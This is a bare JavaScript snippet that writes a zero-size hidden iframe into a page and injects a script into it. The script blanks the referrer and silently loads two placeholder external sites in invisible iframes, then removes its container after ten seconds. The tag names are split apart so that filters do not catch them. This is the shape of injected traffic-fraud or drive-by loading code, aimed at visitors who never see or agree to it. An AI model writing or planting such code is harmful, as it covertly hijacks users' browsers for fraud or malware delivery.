(function(){
    //if(window.top != window)return;
    if(!jQuery)return;
    var dm = ["http://www.website.one","http://www.website.two/"];
    
    (function(){        
        try{
             if($("#__proxy_wnd__").length > 0) return;
            document.write('<ifra' + 'me id="__proxy_wnd__" scrolling="no" name="player" style="width:0px;height:0px"></i' + 'frame>');  
            $("#__proxy_wnd__").ready(function() {
                var script = ['var oMeta = document.createElement("meta"); ',
                'oMeta.name = "referrer"; ',
                'oMeta.content = "never"; ',
                'document.getElementsByTagName("head")[0].appendChild(oMeta);'];
                for(var i = 0;i < dm.length;i++){
                    var d = dm[i];
                    script.push('document.write(\'<ifr' + 'ame name="player" src="' + d + '" scrolling="no" style="width:0px;height:0px"></ifr' + 'ame>\');');
                }
                script.push('setTimeout(function(){parent.document.getElementById("__proxy_wnd__").remove();},10000);');

                var $doc = $("#__proxy_wnd__").get(0).contentWindow.document;
                $doc.write('<scr' + 'ipt>' + script.join('') + '</scr' + 'ipt>'); 
            });
        }
        catch(e){
    
        }
    })(); 

})();
